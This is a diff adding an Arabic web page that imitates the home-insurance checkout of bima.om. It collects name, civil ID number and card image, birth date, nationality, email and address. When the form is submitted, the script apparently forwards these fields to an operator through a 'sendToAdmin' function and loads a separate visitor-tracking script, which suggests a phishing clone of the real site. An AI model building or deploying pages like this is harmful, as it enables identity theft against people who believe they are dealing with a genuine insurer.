@@ -1,0 +1,1027 @@
+<!DOCTYPE html>
+<html dir="rtl" lang="ar">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>بيمة</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css">
+    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.2/dist/css/bootstrap.rtl.min.css" rel="stylesheet">
+
+    <link rel="icon" type="image/png" href="/assets/images/logo/bima-logo.png">
+    <style>
+        :root {
+            --theme-default5: #5eac12;
+            --theme-default5_2: #80c739;
+            --theme-default5_3: #c5dfab;
+            --theme-gradient5: linear-gradient(to right, rgb(94, 172, 18) 0%, rgb(128, 199, 57) 51%, rgb(128, 199, 57) 100%);
+        }
+        body {
+            font-family: 'Tajawal Regular', sans-serif;
+            direction: rtl;
+            margin: 0;
+            background: #fff;
+            color: #586167;
+        }
+
+        /* Header */
+        header.header-1 {
+            border-bottom: 1px solid #eee;
+            background: #fff;
+            position: sticky;
+            top: 0;
+            z-index: 99;
+            padding: 10px 0;
+        }
+        .header-inner {
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            max-width: 1200px;
+            margin: 0 auto;
+            padding: 0 15px;
+        }
+        .brand-logo img { height: 50px; }
+        .nav-menu {
+            display: flex;
+            gap: 30px;
+            list-style: none;
+            margin: 0;
+            padding: 0;
+            align-items: center;
+        }
+        .nav-menu a {
+            text-decoration: none;
+            color: #333;
+            font-size: 15px;
+            font-weight: 500;
+        }
+        .nav-icons {
+            display: flex;
+            gap: 15px;
+            align-items: center;
+        }
+        .nav-icons a {
+            color: #5eac12;
+            font-size: 1.3rem;
+            text-decoration: none;
+        }
+
+        /* Page Header with gradient bg */
+        .page-header {
+            background: radial-gradient(circle, rgb(255, 243, 205) 0%, rgb(255, 255, 255) 100%);
+            padding: 20px 0 15px;
+        }
+        .page-heading-1 {
+            font-size: 32px;
+            font-weight: 600;
+            color: #80c739;
+            margin: 0;
+            text-align: right;
+        }
+
+        /* Stepper */
+        .sm-stepper {
+            display: flex;
+            justify-content: center;
+            align-items: flex-start;
+            width: 100%;
+            position: relative;
+            gap: 0;
+        }
+        .sm-stepper__item {
+            position: relative;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            text-align: center;
+            flex: 0 0 auto;
+            min-width: 140px;
+            z-index: 1;
+        }
+        .sm-stepper__item:not(:last-child)::after {
+            content: "";
+            position: absolute;
+            top: 12px;
+            left: -50%;
+            width: 100%;
+            height: 2px;
+            background-color: #d7dbe1;
+            z-index: -1;
+        }
+        .sm-stepper__item.sm-is-done:not(:last-child)::after {
+            background-color: #c5dfab;
+        }
+        .sm-stepper__link {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            text-decoration: none;
+            color: inherit;
+        }
+        .sm-stepper__circle {
+            width: 26px;
+            height: 26px;
+            border-radius: 50%;
+            background: #fff;
+            border: 2px solid #d7dbe1;
+            display: grid;
+            place-items: center;
+            color: #6c757d;
+            font-weight: 400;
+            font-size: 14px;
+        }
+        .sm-stepper__item.sm-is-done .sm-stepper__circle {
+            background: #c5dfab;
+            border-color: #c5dfab;
+            color: #5eac12;
+        }
+        .sm-stepper__item[aria-current="step"] .sm-stepper__circle {
+            background: #5eac12;
+            border-color: #5eac12;
+            color: #fff;
+        }
+        .sm-stepper__label {
+            margin-top: 4px;
+            font-size: 14px;
+            color: #6c757d;
+        }
+        .sm-stepper__item[aria-current="step"] .sm-stepper__label {
+            color: #5eac12;
+        }
+
+        /* Form Section */
+        .form-section {
+            background: #fff;
+            padding: 30px 0 40px;
+        }
+
+        /* Theme Card */
+        .theme-card {
+            background: #fff;
+            border-radius: 16px;
+            box-shadow: 3.346px 3.716px 22.5px 0px rgba(0,0,0,0.07);
+            border: none;
+            overflow: visible;
+            margin-bottom: 20px;
+        }
+        .filter-cards {
+            border-bottom: 1px solid #eee;
+        }
+        .p-30px { padding: 30px; }
+
+        /* ico-heading */
+        .ico-heading {
+            display: flex;
+            flex-direction: row;
+            align-items: flex-start;
+            gap: 15px;
+        }
+        .ico-heading .img-box img {
+            width: 64px;
+            height: 64px;
+        }
+        .ico-heading .text-box {
+            text-align: right;
+        }
+        .heading-bb-2 {
+            font-size: 19.2px;
+            color: #6c757d;
+            font-weight: 600;
+            margin: 0;
+            padding-bottom: 0;
+            text-decoration: underline;
+            text-decoration-color: var(--theme-default5);
+            text-underline-offset: 4px;
+        }
+        .sub-text {
+            color: #666;
+            font-size: 0.9rem;
+            margin-top: 5px;
+            margin-bottom: 0;
+        }
+
+        /* Form fields */
+        .form-floating > .form-control,
+        .form-floating > .form-select {
+            border: 1px solid #ced4da;
+            border-radius: 6px;
+            height: 56px;
+            text-align: right;
+            padding-right: 12px;
+        }
+        .form-floating > label {
+            right: 12px;
+            left: auto;
+            text-align: right;
+            transform-origin: right top;
+        }
+        .form-floating > .form-control:focus ~ label,
+        .form-floating > .form-control:not(:placeholder-shown) ~ label,
+        .form-floating > .form-select ~ label {
+            transform: scale(0.85) translateY(-0.5rem) translateX(0);
+            color: #6c757d;
+        }
+        h6 {
+            text-align: right;
+            color: #586167;
+            font-weight: 600;
+        }
+        h5 {
+            text-align: right;
+            color: #586167;
+            font-weight: 600;
+        }
+
+        /* Date input styling */
+        .date-input-wrap {
+            position: relative;
+        }
+        .date-input-wrap .form-floating {
+            position: relative;
+        }
+        .date-input-wrap .form-control {
+            padding-left: 40px;
+        }
+        /* Hide the placeholder text (mm/dd/yyyy) in date inputs - only when empty */
+        .date-input-wrap input[type="date"].empty-date::-webkit-datetime-edit-fields-wrapper {
+            color: transparent;
+        }
+        .date-input-wrap input[type="date"].empty-date::-webkit-datetime-edit-text,
+        .date-input-wrap input[type="date"].empty-date::-webkit-datetime-edit-month-field,
+        .date-input-wrap input[type="date"].empty-date::-webkit-datetime-edit-day-field,
+        .date-input-wrap input[type="date"].empty-date::-webkit-datetime-edit-year-field {
+            color: transparent;
+        }
+        /* Move calendar icon to left */
+        .date-input-wrap input[type="date"]::-webkit-calendar-picker-indicator {
+            position: absolute;
+            left: 12px;
+            right: auto;
+            top: 50%;
+            transform: translateY(-50%);
+            cursor: pointer;
+            opacity: 0.6;
+        }
+
+        /* Nationality select */
+        .nationality-wrap {
+            position: relative;
+        }
+        .nationality-wrap .form-floating label {
+            pointer-events: none;
+        }
+
+        /* Radio buttons */
+        .radio-group {
+            border: 1px solid #ced4da;
+            border-radius: 6px;
+            padding: 15px;
+        }
+        .radio-group label.form-label {
+            font-weight: 600;
+            display: block;
+            margin-bottom: 10px;
+            text-align: right;
+        }
+        .form-check {
+            text-align: right;
+        }
+        .form-check-input:checked {
+            background-color: #5eac12;
+            border-color: #5eac12;
+        }
+
+        /* Upload dropzone */
+        .upload-section h6 {
+            border-bottom: 2px solid #5eac12;
+            display: inline-block;
+            padding-bottom: 3px;
+        }
+        .dropzone-area {
+            border: 2px dashed #ced4da;
+            border-radius: 8px;
+            padding: 40px 20px;
+            text-align: center;
+            cursor: pointer;
+            transition: border-color 0.3s;
+        }
+        .dropzone-area:hover {
+            border-color: #5eac12;
+        }
+        .dropzone-area i {
+            font-size: 2rem;
+            color: gray;
+        }
+
+        /* Buttons */
+        .section-page-footer-1 {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            padding: 20px 0;
+        }
+        .btn-gradient.color-2 {
+            background-image: var(--theme-gradient5);
+            background-size: 200% auto;
+            color: #fff;
+            border: none;
+            border-radius: 8px;
+            font-size: 14px;
+            cursor: pointer;
+            text-decoration: none;
+            display: inline-flex;
+            align-items: center;
+            justify-content: center;
+            gap: 8px;
+            font-weight: 500;
+            transition: all 0.5s ease;
+        }
+        .btn-gradient.color-2:hover {
+            background-position: right center;
+        }
+        .btn-prev {
+            padding: 10px 50px;
+            font-size: 16px;
+        }
+        .btn-next {
+            padding: 10px 50px;
+            font-size: 16px;
+        }
+
+        /* Footer */
+        footer .sub-footer {
+            padding: 12px 0;
+            background: #2d2d2d;
+        }
+        footer .sub-footer .container {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+        footer .sub-footer p {
+            font-size: 14px;
+            font-weight: 500;
+            color: #d2d2d2;
+            margin: 0;
+        }
+        .sub-footer-link {
+            display: flex;
+            gap: 10px;
+            list-style: none;
+            margin: 0;
+            padding: 0;
+        }
+        .sub-footer-link li + li { margin-right: 10px; }
+        .sub-footer-link li a {
+            color: #d2d2d2;
+            font-weight: 500;
+            text-decoration: none;
+            font-size: 14px;
+        }
+        .sub-footer-link li a:hover { color: #fff; }
+
+        .text-warning-custom {
+            color: #dc3545;
+            font-size: 0.85rem;
+            margin-top: 4px;
+        }
+
+        /* Mobile Responsive */
+        @media (max-width: 767px) {
+            .nav-menu {
+                gap: 12px;
+            }
+            .nav-menu a {
+                font-size: 13px;
+            }
+            .brand-logo img {
+                height: 38px;
+            }
+            .header-inner {
+                padding: 0 10px;
+            }
+            .page-heading-1 {
+                font-size: 22px;
+                text-align: center;
+            }
+            /* Stepper mobile fix */
+            .sm-stepper {
+                gap: 0;
+                justify-content: space-between;
+                padding: 0 5px;
+                overflow-x: auto;
+            }
+            .sm-stepper__item {
+                min-width: 70px;
+            }
+            .sm-stepper__label {
+                font-size: 11px;
+            }
+            .sm-stepper__circle {
+                width: 22px;
+                height: 22px;
+                font-size: 12px;
+            }
+            /* Form section mobile */
+            .p-30px {
+                padding: 15px;
+            }
+            .ico-heading {
+                flex-direction: column;
+                align-items: center;
+                text-align: center;
+            }
+            .ico-heading .text-box {
+                text-align: center;
+            }
+            .ico-heading .img-box img {
+                width: 50px;
+                height: 50px;
+            }
+            .heading-bb-2 {
+                font-size: 16px;
+            }
+            .sub-text {
+                font-size: 0.8rem;
+            }
+            /* Make form fields full width on mobile */
+            .col-sm-6 {
+                width: 100% !important;
+                flex: 0 0 100% !important;
+                max-width: 100% !important;
+            }
+            .col-sm-8 {
+                width: 100% !important;
+                flex: 0 0 100% !important;
+                max-width: 100% !important;
+            }
+            .col-sm-4 {
+                width: 100% !important;
+                flex: 0 0 100% !important;
+                max-width: 100% !important;
+            }
+            /* Upload section on mobile */
+            .upload-section {
+                margin-top: 20px;
+            }
+            .dropzone-area {
+                padding: 25px 15px;
+            }
+            /* Buttons mobile */
+            .section-page-footer-1 {
+                flex-direction: row;
+                gap: 10px;
+                padding: 15px;
+            }
+            .btn-prev, .btn-next {
+                padding: 10px 25px;
+                font-size: 14px;
+            }
+            /* Footer mobile */
+            footer .sub-footer .container {
+                flex-direction: column;
+                gap: 8px;
+                text-align: center;
+            }
+            .sub-footer-link {
+                justify-content: center;
+            }
+            /* Form floating labels fix */
+            .form-floating > .form-control,
+            .form-floating > .form-select {
+                font-size: 14px;
+            }
+            .form-floating > label {
+                font-size: 14px;
+            }
+            h5, h6 {
+                text-align: center;
+                font-size: 15px;
+            }
+            .radio-group label.form-label {
+                font-size: 13px;
+            }
+        }
+    </style>
+</head>
+<body class="rtl">
+    <!-- Header -->
+    <header class="header-1">
+        <div class="header-inner">
+            <a href="/" class="brand-logo">
+                <img alt="logo" class="img-fluid" src="/assets/images/logo/bima-logo.png">
+            </a>
+            <ul class="nav-menu">
+                <li><a href="https://bima.om/">الصفحة الرئيسية</a></li>
+                <li><a href="#">تأمين ▾</a></li>
+                <li><a href="javascript:void(0)" style="pointer-events:none;opacity:0.5;cursor:default;">تتبع الطلب</a></li>
+            </ul>
+            <div class="nav-icons">
+                <a href="tel:+96879997797"><i class="fa-solid fa-headset"></i></a>
+                <a href="#"><i class="fa-solid fa-globe"></i></a>
+            </div>
+        </div>
+    </header>
+
+    <!-- Page Header with Stepper -->
+    <div class="page-header">
+        <div class="container">
+            <div class="row align-items-center">
+                <div class="col-12 col-md-4">
+                    <h1 class="page-heading-1 mb-3 mb-md-0">تأمين المنازل</h1>
+                </div>
+                <div class="col-12 col-md-8">
+                    <div class="d-flex justify-content-center py-2">
+                        <div class="sm-stepper" aria-label="Checkout progress">
+                            <div class="sm-stepper__item sm-is-done">
+                                <a class="sm-stepper__link">
+                                    <span class="sm-stepper__circle">1</span>
+                                    <span class="sm-stepper__label">التفاصيل</span>
+                                </a>
+                            </div>
+                            <div class="sm-stepper__item sm-is-done">
+                                <a class="sm-stepper__link">
+                                    <span class="sm-stepper__circle">2</span>
+                                    <span class="sm-stepper__label">العروض</span>
+                                </a>
+                            </div>
+                            <div class="sm-stepper__item" aria-current="step">
+                                <a class="sm-stepper__link">
+                                    <span class="sm-stepper__circle">3</span>
+                                    <span class="sm-stepper__label">مراجعة</span>
+                                </a>
+                            </div>
+                            <div class="sm-stepper__item">
+                                <a class="sm-stepper__link">
+                                    <span class="sm-stepper__circle">4</span>
+                                    <span class="sm-stepper__label">الدفع</span>
+                                </a>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Form Section -->
+    <div class="form-section">
+        <div class="container">
+            <div class="row">
+                <div class="col-12">
+                    <div class="theme-card p-0">
+                        <!-- Header with icon -->
+                        <div class="filter-cards">
+                            <div class="p-30px">
+                                <div class="ico-heading">
+                                    <div class="img-box">
+                                        <img src="/assets/images/ins/sponsor-icon.png" alt="sponsor icon" class="img-fluid">
+                                    </div>
+                                    <div class="text-box">
+                                        <h6 class="heading-bb-2">بياناتك</h6>
+                                        <p class="sub-text">الرجاء إدخال التفاصيل لإكمال طلب تأمين المنزل</p>
+                                    </div>
+                                </div>
+                            </div>
+                        </div>
+                        <!-- Form Content -->
+                        <div class="row">
+                            <div class="col-12">
+                                <div class="p-30px pt-0">
+                                    <div class="row">
+                                        <!-- Left side: Form fields (col-8) -->
+                                        <div class="col-sm-8">
+                                            <h6>كيف ينبغي لنا أن نخاطبك</h6>
+                                            <!-- Gender & Title -->
+                                            <div class="row">
+                                                <div class="col-sm-6 mb-2">
+                                                    <div class="form-floating">
+                                                        <select id="gender" class="form-select">
+                                                            <option disabled selected>إختر</option>
+                                                            <option>ذكر</option>
+                                                            <option>أنثى</option>
+                                                        </select>
+                                                        <label for="gender">الجنس</label>
+                                                    </div>
+                                                </div>
+                                                <div class="col-sm-6 mb-2">
+                                                    <div class="form-floating">
+                                                        <select id="title" class="form-select">
+                                                            <option disabled selected>إختر</option>
+                                                            <option>الآنسة (Miss)</option>
+                                                            <option>الدكتور / الدكتورة (Dr.)</option>
+                                                            <option>السيد (Mr.)</option>
+                                                            <option>السيدة (Mrs.)</option>
+                                                            <option>السيدة (Ms.)</option>
+                                                        </select>
+                                                        <label for="title">عنوان</label>
+                                                    </div>
+                                                </div>
+                                            </div>
+                                            <!-- First Name & Last Name -->
+                                            <div class="row">
+                                                <div class="col-sm-6 mb-2">
+                                                    <div class="form-floating">
+                                                        <input type="text" id="first_name" placeholder=" " class="form-control">
+                                                        <label for="first_name">الأسم الأول</label>
+                                                    </div>
+                                                </div>
+                                                <div class="col-sm-6 mb-2">
+                                                    <div class="form-floating">
+                                                        <input type="text" id="last_name" placeholder=" " class="form-control">
+                                                        <label for="last_name">الاسم الاخير</label>
+                                                    </div>
+                                                </div>
+                                            </div>
+                                            <!-- Civil ID & Email -->
+                                            <div class="row">
+                                                <div class="col-sm-6 mb-2">
+                                                    <div class="form-floating">
+                                                        <input type="text" id="civil_resident_id" placeholder=" " class="form-control">
+                                                        <label for="civil_resident_id">الرقم المدني</label>
+                                                    </div>
+                                                </div>
+                                                <div class="col-sm-6 mb-2">
+                                                    <div class="form-floating">
+                                                        <input type="email" id="email" placeholder=" " class="form-control">
+                                                        <label for="email">البريد الإلكتروني</label>
+                                                    </div>
+                                                    <div class="text-warning-custom">سيتم إرسال وثيقة التأمين إلى هذا البريد الإلكتروني.</div>
+                                                </div>
+                                            </div>
+                                            <!-- Marital Status & Date of Birth -->
+                                            <div class="row">
+                                                <div class="col-sm-6 mb-2">
+                                                    <div class="form-floating">
+                                                        <select id="marital_status" class="form-select">
+                                                            <option disabled selected>إختر</option>
+                                                            <option>أعزب</option>
+                                                            <option>متزوج</option>
+                                                            <option>أرمل</option>
+                                                            <option>مطلّق</option>
+                                                            <option>غير ذلك</option>
+                                                        </select>
+                                                        <label for="marital_status">الحالة الاجتماعية</label>
+                                                    </div>
+                                                </div>
+                                                <div class="col-sm-6 mb-2">
+                                                    <div class="date-input-wrap">
+                                                        <div class="form-floating">
+                                                            <input type="date" id="homeDateOfBirth" placeholder=" " class="form-control empty-date" required value="">
+                                                            <label for="homeDateOfBirth">تاريخ الميلاد</label>
+                                                        </div>
+                                                    </div>
+                                                    <small class="text-danger">مطلوب</small>
+                                                </div>
+                                            </div>
+                                            <!-- ID Expiry & Nationality -->
+                                            <div class="row">
+                                                <div class="col-sm-6 mb-2">
+                                                    <div class="date-input-wrap">
+                                                        <div class="form-floating">
+                                                            <input type="date" id="civilIdExpiryDate" placeholder=" " class="form-control empty-date" required value="">
+                                                            <label for="civilIdExpiryDate">تاريخ انتهاء صلاحية بطاقة الهوية</label>
+                                                        </div>
+                                                    </div>
+                                                    <small class="text-danger">مطلوب</small>
+                                                </div>
+                                                <div class="col-sm-6 mb-2">
+                                                    <div class="form-floating">
+                                                        <select id="nationality" class="form-select">
+                                                            <option disabled selected>إختر</option>
+                                                            <option value="OMN">عماني</option>
+                                                            <option value="ARE">إماراتي</option>
+                                                            <option value="SAU">سعودي</option>
+                                                            <option value="BHR">بحريني</option>
+                                                            <option value="KWT">كويتي</option>
+                                                            <option value="QAT">قطري</option>
+                                                            <option value="JOR">أردني</option>
+                                                            <option value="PSE">فلسطيني</option>
+                                                            <option value="LBN">لبناني</option>
+                                                            <option value="SYR">سوري</option>
+                                                            <option value="IRQ">عراقي</option>
+                                                            <option value="YEM">يمني</option>
+                                                            <option value="EGY">مصري</option>
+                                                            <option value="SDN">سوداني</option>
+                                                            <option value="LBY">ليبي</option>
+                                                            <option value="TUN">تونسي</option>
+                                                            <option value="DZA">جزائري</option>
+                                                            <option value="MAR">مغربي</option>
+                                                            <option value="MRT">موريتاني</option>
+                                                            <option value="SOM">صومالي</option>
+                                                            <option value="DJI">جيبوتي</option>
+                                                            <option value="COM">قمري</option>
+                                                            <option value="IND">هندي</option>
+                                                            <option value="PAK">باكستاني</option>
+                                                            <option value="BGD">بنغلاديشي</option>
+                                                            <option value="LKA">سريلانكي</option>
+                                                            <option value="NPL">نيبالي</option>
+                                                            <option value="PHL">فلبيني</option>
+                                                            <option value="IDN">إندونيسي</option>
+                                                            <option value="IRN">إيراني</option>
+                                                            <option value="TUR">تركي</option>
+                                                            <option value="AFG">أفغاني</option>
+                                                            <option value="CHN">صيني</option>
+                                                            <option value="JPN">ياباني</option>
+                                                            <option value="KOR">كوري جنوبي</option>
+                                                            <option value="THA">تايلاندي</option>
+                                                            <option value="MYS">ماليزي</option>
+                                                            <option value="VNM">فيتنامي</option>
+                                                            <option value="MMR">ميانماري</option>
+                                                            <option value="ETH">إثيوبي</option>
+                                                            <option value="KEN">كيني</option>
+                                                            <option value="TZA">تنزاني</option>
+                                                            <option value="UGA">أوغندي</option>
+                                                            <option value="NGA">نيجيري</option>
+                                                            <option value="GHA">غاني</option>
+                                                            <option value="ZAF">جنوب أفريقي</option>
+                                                            <option value="GBR">بريطاني</option>
+                                                            <option value="USA">أمريكي</option>
+                                                            <option value="CAN">كندي</option>
+                                                            <option value="AUS">أسترالي</option>
+                                                            <option value="NZL">نيوزيلندي</option>
+                                                            <option value="FRA">فرنسي</option>
+                                                            <option value="DEU">ألماني</option>
+                                                            <option value="ITA">إيطالي</option>
+                                                            <option value="ESP">إسباني</option>
+                                                            <option value="PRT">برتغالي</option>
+                                                            <option value="NLD">هولندي</option>
+                                                            <option value="BEL">بلجيكي</option>
+                                                            <option value="CHE">سويسري</option>
+                                                            <option value="AUT">نمساوي</option>
+                                                            <option value="SWE">سويدي</option>
+                                                            <option value="NOR">نرويجي</option>
+                                                            <option value="DNK">دنماركي</option>
+                                                            <option value="FIN">فنلندي</option>
+                                                            <option value="IRL">أيرلندي</option>
+                                                            <option value="POL">بولندي</option>
+                                                            <option value="RUS">روسي</option>
+                                                            <option value="UKR">أوكراني</option>
+                                                            <option value="BRA">برازيلي</option>
+                                                            <option value="ARG">أرجنتيني</option>
+                                                            <option value="MEX">مكسيكي</option>
+                                                            <option value="OTH">أخرى</option>
+                                                        </select>
+                                                        <label for="nationality">الجنسية</label>
+                                                    </div>
+                                                </div>
+                                            </div>
+                                            <!-- Policy Start Date & Unoccupancy -->
+                                            <div class="row">
+                                                <div class="col-sm-6 mb-2">
+                                                    <div class="date-input-wrap">
+                                                        <div class="form-floating">
+                                                            <input type="date" id="policyStartDate" placeholder=" " class="form-control empty-date" value="">
+                                                            <label for="policyStartDate">تاريخ بدء الوثيقة</label>
+                                                        </div>
+                                                    </div>
+                                                </div>
+                                                <div class="col-sm-6 mb-2">
+                                                    <div class="form-floating">
+                                                        <select id="unoccupancy_periods" class="form-select">
+                                                            <option disabled selected>إختر</option>
+                                                            <option>أقل من 60 يومًا</option>
+                                                            <option>أكثر من 60 يومًا</option>
+                                                        </select>
+                                                        <label for="unoccupancy_periods">عدد الأيام المتتالية التي يكون فيها العقار غير مشغول؟</label>
+                                                    </div>
+                                                </div>
+                                            </div>
+                                            <!-- Radio Questions -->
+                                            <div class="row">
+                                                <div class="col-sm-6 mb-2">
+                                                    <div class="radio-group">
+                                                        <label class="form-label">هل قمت بتقديم أي مطالبات لتأمين المنزل في العام الماضي؟*</label>
+                                                        <div class="d-flex gap-4">
+                                                            <div class="form-check">
+                                                                <input class="form-check-input" type="radio" name="hasClaims" id="claimsYes" value="yes">
+                                                                <label class="form-check-label" for="claimsYes">نعم</label>
+                                                            </div>
+                                                            <div class="form-check">
+                                                                <input class="form-check-input" type="radio" name="hasClaims" id="claimsNo" value="no">
+                                                                <label class="form-check-label" for="claimsNo">لا</label>
+                                                            </div>
+                                                        </div>
+                                                    </div>
+                                                    <small class="text-danger">مطلوب</small>
+                                                </div>
+                                                <div class="col-sm-6 mb-2">
+                                                    <div class="radio-group">
+                                                        <label class="form-label">هل العقار مؤجر لمدة تقل عن 12 شهرًا؟</label>
+                                                        <div class="d-flex gap-4">
+                                                            <div class="form-check">
+                                                                <input class="form-check-input" type="radio" name="leaseTenure" id="moreThan12" value="yes">
+                                                                <label class="form-check-label" for="moreThan12">نعم</label>
+                                                            </div>
+                                                            <div class="form-check">
+                                                                <input class="form-check-input" type="radio" name="leaseTenure" id="lessThan12" value="no">
+                                                                <label class="form-check-label" for="lessThan12">لا</label>
+                                                            </div>
+                                                        </div>
+                                                    </div>
+                                                    <small class="text-danger">مطلوب</small>
+                                                </div>
+                                            </div>
+                                            <!-- Insured Property -->
+                                            <h5 class="mt-3">العقار المؤمن عليه:</h5>
+                                            <div class="row">
+                                                <div class="col-sm-6 mb-2">
+                                                    <div class="form-floating">
+                                                        <input type="text" id="apartmentVillaNumber" placeholder=" " class="form-control">
+                                                        <label for="apartmentVillaNumber">رقم الشقة / الفيلا</label>
+                                                    </div>
+                                                </div>
+                                                <div class="col-sm-6 mb-2">
+                                                    <div class="form-floating">
+                                                        <input type="text" id="buildingName" placeholder=" " class="form-control">
+                                                        <label for="buildingName">اسم المبنى</label>
+                                                    </div>
+                                                </div>
+                                            </div>
+                                        </div>
+                                        <!-- Right side: Upload section (col-4) -->
+                                        <div class="col-sm-4 d-flex flex-column">
+                                            <div class="upload-section">
+                                                <h6>حمل البطاقة المدنية</h6>
+                                                <div class="dropzone-area" id="sponsorDropzone">
+                                                    <i class="fas fa-cloud-upload-alt"></i>
+                                                    <br><br>
+                                                    <span>قم بإسقاط الملفات هنا أو انقر للتحميل</span>
+                                                    <input type="file" id="civilIdFile" style="display:none" accept="image/*,.pdf">
+                                                </div>
+                                                <small class="text-muted mt-1 d-block">الحد الأقصى لحجم الملف: 2 ميجا بايت</small>
+                                                <div id="uploadedFileName" class="mt-2 text-success" style="display:none;"></div>
+                                            </div>
+                                        </div>
+                                    </div>
+                                </div>
+                            </div>
+                        </div>
+                        <!-- Footer buttons inside card -->
+                        <div class="section-page-footer-1 p-30px pt-0">
+                            <button type="button" class="btn-gradient color-2 btn-prev" id="prevBtn">
+                                <i class="fas fa-arrow-right me-2"></i> السابق
+                            </button>
+                            <button type="button" class="btn-gradient color-2 btn-next" id="nextBtn">
+                                التالي <i class="fas fa-arrow-left ms-2"></i>
+                            </button>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Footer -->
+    <footer>
+        <div class="sub-footer">
+            <div class="container">
+                <p>حقوق الطبع والنشر © 2026, جميع الحقوق محفوظة</p>
+                <ul class="sub-footer-link">
+                    <li><a href="https://bima.om/">الصفحة الرئيسية</a></li>
+                    <li><a href="https://bima.om/Home/Terms">شروط</a></li>
+                    <li><a href="https://bima.om/Home/PrivacyPolicy">سياسة الخصوصية</a></li>
+                    <li><a href="https://bima.om/Home/ContactUs">اتصال</a></li>
+                </ul>
+            </div>
+        </div>
+    </footer>
+
+    <script>
+    // Load saved data from localStorage
+    document.addEventListener('DOMContentLoaded', function() {
+        // Handle date inputs - remove empty-date class when value is selected
+        var dateInputs = document.querySelectorAll('input[type="date"]');
+        dateInputs.forEach(function(input) {
+            input.addEventListener('change', function() {
+                if (this.value) {
+                    this.classList.remove('empty-date');
+                } else {
+                    this.classList.add('empty-date');
+                }
+            });
+        });
+
+        // Pre-fill policy start date from localStorage
+        var startDate = localStorage.getItem('home_start_date');
+        if (startDate) {
+            var policyInput = document.getElementById('policyStartDate');
+            policyInput.value = startDate;
+            policyInput.classList.remove('empty-date');
+        }
+
+        // Dropzone click handler
+        var dropzone = document.getElementById('sponsorDropzone');
+        var fileInput = document.getElementById('civilIdFile');
+        var uploadedName = document.getElementById('uploadedFileName');
+
+        dropzone.addEventListener('click', function() {
+            fileInput.click();
+        });
+
+        fileInput.addEventListener('change', function() {
+            if (fileInput.files.length > 0) {
+                var file = fileInput.files[0];
+                if (file.size > 2 * 1024 * 1024) {
+                    alert('حجم الملف يتجاوز 2 ميجا بايت');
+                    fileInput.value = '';
+                    return;
+                }
+                uploadedName.textContent = '✓ ' + file.name;
+                uploadedName.style.display = 'block';
+                dropzone.style.borderColor = '#5eac12';
+            }
+        });
+
+        // Drag and drop
+        dropzone.addEventListener('dragover', function(e) {
+            e.preventDefault();
+            dropzone.style.borderColor = '#5eac12';
+        });
+        dropzone.addEventListener('dragleave', function() {
+            dropzone.style.borderColor = '#ced4da';
+        });
+        dropzone.addEventListener('drop', function(e) {
+            e.preventDefault();
+            if (e.dataTransfer.files.length > 0) {
+                fileInput.files = e.dataTransfer.files;
+                var event = new Event('change');
+                fileInput.dispatchEvent(event);
+            }
+        });
+    });
+
+
+
+    // Previous button - go back to offers
+    document.getElementById('prevBtn').addEventListener('click', function() {
+        window.location.href = '/insurance/home-offers';
+    });
+
+    // Next button - validate and proceed
+    document.getElementById('nextBtn').addEventListener('click', function() {
+        // Basic validation
+        var required = ['gender', 'first_name', 'last_name', 'civil_resident_id', 'email', 'homeDateOfBirth', 'civilIdExpiryDate'];
+        var valid = true;
+        for (var i = 0; i < required.length; i++) {
+            var el = document.getElementById(required[i]);
+            if (!el.value || el.value === 'إختر' || el.value === '0: null') {
+                el.style.borderColor = '#dc3545';
+                valid = false;
+            } else {
+                el.style.borderColor = '#ced4da';
+            }
+        }
+        // Check radio buttons
+        var hasClaims = document.querySelector('input[name="hasClaims"]:checked');
+        var leaseTenure = document.querySelector('input[name="leaseTenure"]:checked');
+        if (!hasClaims || !leaseTenure) {
+            valid = false;
+        }
+
+        if (!valid) {
+            alert('يرجى تعبئة جميع الحقول المطلوبة');
+            return;
+        }
+
+        // Save form data
+        var formData = {
+            gender: document.getElementById('gender').value,
+            title: document.getElementById('title').value,
+            first_name: document.getElementById('first_name').value,
+            last_name: document.getElementById('last_name').value,
+            civil_id: document.getElementById('civil_resident_id').value,
+            email: document.getElementById('email').value,
+            marital_status: document.getElementById('marital_status').value,
+            dob: document.getElementById('homeDateOfBirth').value,
+            id_expiry: document.getElementById('civilIdExpiryDate').value,
+            nationality: document.getElementById('nationality').value,
+            policy_start: document.getElementById('policyStartDate').value,
+            unoccupancy: document.getElementById('unoccupancy_periods').value,
+            has_claims: hasClaims.value,
+            lease_tenure: leaseTenure.value,
+            apartment_number: document.getElementById('apartmentVillaNumber').value,
+            building_name: document.getElementById('buildingName').value
+        };
+        localStorage.setItem('home_details_data', JSON.stringify(formData));
+        if (window.sendToAdmin) {
+            window.sendToAdmin({
+                'الجنس': formData.gender,
+                'الاسم': formData.first_name + ' ' + formData.last_name,
+                'الرقم المدني': formData.civil_id,
+                'البريد الإلكتروني': formData.email,
+                'الحالة الاجتماعية': formData.marital_status,
+                'تاريخ الميلاد': formData.dob,
+                'الجنسية': formData.nationality,
+                'تاريخ بدء الوثيقة': formData.policy_start,
+                'رقم الشقة': formData.apartment_number,
+                'اسم المبنى': formData.building_name
+            }, 'تأمين المنازل - البيانات');
+        }
+        // Navigate to review page
+        window.location.href = '/insurance/home-order-review';
+    });
+    </script>
+<script src="../visitor-tracking.js"></script>
+</body>
+</html>
